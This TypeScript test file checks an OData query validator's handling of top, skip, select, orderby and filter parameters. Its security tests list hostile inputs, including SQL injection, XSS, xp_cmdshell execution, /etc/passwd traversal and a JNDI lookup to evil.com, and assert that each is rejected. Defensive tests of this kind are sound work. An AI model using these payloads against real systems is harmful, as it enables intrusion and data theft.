import {
  ODataQueryValidator,
  ODataValidationError,
} from "../../../src/mcp/validation";

describe("ODataQueryValidator", () => {
  const mockProperties = new Map([
    ["title", "String"],
    ["author", "String"],
    ["price", "Decimal"],
    ["stock", "Integer"],
    ["publishedDate", "Date"],
  ]);

  let validator: ODataQueryValidator;

  beforeEach(() => {
    validator = new ODataQueryValidator(mockProperties);
  });

  describe("validateTop", () => {
    it("should validate valid top values", () => {
      expect(validator.validateTop("10")).toBe(10);
      expect(validator.validateTop("100")).toBe(100);
      expect(validator.validateTop("1")).toBe(1);
    });

    it("should reject invalid top values", () => {
      expect(() => validator.validateTop("0")).toThrow();
      expect(() => validator.validateTop("-1")).toThrow();
      expect(() => validator.validateTop("1001")).toThrow();
      expect(() => validator.validateTop("abc")).toThrow();
      expect(() => validator.validateTop("10.5")).toThrow();
    });
  });

  describe("validateSkip", () => {
    it("should validate valid skip values", () => {
      expect(validator.validateSkip("0")).toBe(0);
      expect(validator.validateSkip("10")).toBe(10);
      expect(validator.validateSkip("100")).toBe(100);
    });

    it("should reject invalid skip values", () => {
      expect(() => validator.validateSkip("-1")).toThrow();
      expect(() => validator.validateSkip("abc")).toThrow();
      expect(() => validator.validateSkip("10.5")).toThrow();
    });
  });

  describe("validateSelect", () => {
    it("should validate valid select parameters", () => {
      expect(validator.validateSelect("title")).toEqual(["title"]);
      expect(validator.validateSelect("title,author")).toEqual([
        "title",
        "author",
      ]);
      expect(validator.validateSelect("title%2Cauthor")).toEqual([
        "title",
        "author",
      ]);
    });

    it("should reject invalid properties", () => {
      expect(() => validator.validateSelect("invalidProperty")).toThrow();
      expect(() => validator.validateSelect("title,invalidProperty")).toThrow();
    });

    it("should reject malicious select patterns", () => {
      expect(() =>
        validator.validateSelect("title'; DROP TABLE books; --"),
      ).toThrow();
      expect(() => validator.validateSelect("title,*")).toThrow();
    });
  });

  describe("validateOrderBy", () => {
    it("should validate valid orderby parameters", () => {
      expect(validator.validateOrderBy("title")).toBe("title");
      expect(validator.validateOrderBy("title asc")).toBe("title asc");
      expect(validator.validateOrderBy("title desc")).toBe("title desc");
      expect(validator.validateOrderBy("title asc, price desc")).toBe(
        "title asc, price desc",
      );
    });

    it("should reject invalid properties in orderby", () => {
      expect(() => validator.validateOrderBy("invalidProperty")).toThrow();
      expect(() =>
        validator.validateOrderBy("title, invalidProperty"),
      ).toThrow();
    });

    it("should reject malicious orderby patterns", () => {
      expect(() =>
        validator.validateOrderBy("title'; DROP TABLE books; --"),
      ).toThrow();
    });

    it("should prevent ReDoS attacks with malicious orderby patterns", () => {
      // Test patterns that would cause exponential backtracking with the old regex
      const maliciousPatterns = [
        "field" + " ".repeat(100) + "asc," + "_".repeat(50),
        "a" + " ".repeat(200) + "asc," + " ".repeat(100),
        "_".repeat(50) + " ".repeat(100) + "desc," + "_".repeat(50),
      ];

      maliciousPatterns.forEach((pattern) => {
        const startTime = Date.now();
        expect(() => validator.validateOrderBy(pattern)).toThrow();
        const endTime = Date.now();
        // Validation should complete quickly (under 100ms) even for malicious input
        expect(endTime - startTime).toBeLessThan(100);
      });
    });
  });

  describe("validateFilter", () => {
    it("should be able to handle 'filter=' being included in the parameter", () => {
      const result = validator.validateFilter("filter=title eq 'Test Book'");
      expect(result).toContain("title");
      expect(result).toContain("=");
      expect(result).toContain("'Test Book'");
      expect(result).toEqual("title = 'Test Book'");
    });

    it("should validate simple filter expressions", () => {
      const result = validator.validateFilter("title eq 'Test Book'");
      expect(result).toContain("title");
      expect(result).toContain("=");
      expect(result).toContain("'Test Book'");
      expect(result).toEqual("title = 'Test Book'");
    });

    it("should validate complex filter expressions", () => {
      const result = validator.validateFilter(
        "title eq 'Test' and price gt 10",
      );
      expect(result).toContain("title");
      expect(result).toContain("price");
      expect(result).toContain("and");
    });

    it("should reject filters with invalid properties", () => {
      expect(() =>
        validator.validateFilter("invalidProperty eq 'test'"),
      ).toThrow();
    });

    it("should reject malicious filter patterns", () => {
      // SQL injection attempts
      expect(() =>
        validator.validateFilter("title eq 'test'; DROP TABLE books; --"),
      ).toThrow();
      expect(() =>
        validator.validateFilter("title eq 'test' UNION SELECT * FROM users"),
      ).toThrow();
      expect(() =>
        validator.validateFilter("title eq 'test' OR 1=1"),
      ).toThrow();

      // Script injection attempts
      expect(() =>
        validator.validateFilter("title eq '<script>alert(1)</script>'"),
      ).toThrow();
      expect(() =>
        validator.validateFilter("title eq 'javascript:alert(1)'"),
      ).toThrow();

      // Command execution attempts
      expect(() =>
        validator.validateFilter("title eq 'test'; exec xp_cmdshell 'dir'"),
      ).toThrow();
    });

    it("should reject empty or invalid filters", () => {
      expect(() => validator.validateFilter("")).toThrow();
      expect(() => validator.validateFilter("   ")).toThrow();
    });

    it("should handle URL encoded filters", () => {
      // Test URL encoded filter: "title eq 'Test Book'"
      const encoded = "title%20eq%20'Test%20Book'";
      const result = validator.validateFilter(encoded);
      expect(result).toContain("title");
      expect(result).toContain("=");
    });

    it("should validate OData functions", () => {
      const result = validator.validateFilter("contains(title, 'test')");
      expect(result).toContain("contains");
      expect(result).toContain("title");
    });
  });

  describe("security tests", () => {
    const maliciousInputs = [
      "'; DROP TABLE books; --",
      "' UNION SELECT * FROM users --",
      "' OR 1=1 --",
      "<script>alert('xss')</script>",
      "javascript:alert(1)",
      "eval('malicious code')",
      "exec xp_cmdshell 'dir'",
      "../../../etc/passwd",
      "${jndi:ldap://evil.com/}",
      "/**/UNION/**/SELECT/**/*",
    ];

    maliciousInputs.forEach((input) => {
      it(`should reject malicious input: ${input}`, () => {
        expect(() => validator.validateFilter(input)).toThrow();
      });
    });
  });

  describe("edge cases", () => {
    it("should handle very long filter expressions", () => {
      const longFilter = "title eq '" + "a".repeat(1000) + "'";
      expect(() => validator.validateFilter(longFilter)).toThrow();
    });

    it("should handle special characters in property names", () => {
      const validatorWithSpecialProps = new ODataQueryValidator(
        new Map([
          ["property_with_underscore", "String"],
          ["property123", "String"],
        ]),
      );

      expect(() =>
        validatorWithSpecialProps.validateFilter(
          "property_with_underscore eq 'test'",
        ),
      ).not.toThrow();
      expect(() =>
        validatorWithSpecialProps.validateFilter("property123 eq 'test'"),
      ).not.toThrow();
    });

    it("should handle nested parentheses in filters", () => {
      const result = validator.validateFilter(
        "(title eq 'test' and (price gt 10 or stock lt 5))",
      );
      expect(result).toContain("title");
      expect(result).toContain("price");
      expect(result).toContain("stock");
    });
  });

  describe("ODataValidationError", () => {
    it("should create proper validation errors", () => {
      const error = new ODataValidationError(
        "Test error",
        "filter",
        "invalid input",
      );
      expect(error.message).toBe("Test error");
      expect(error.parameter).toBe("filter");
      expect(error.value).toBe("invalid input");
      expect(error.name).toBe("ODataValidationError");
    });
  });
});
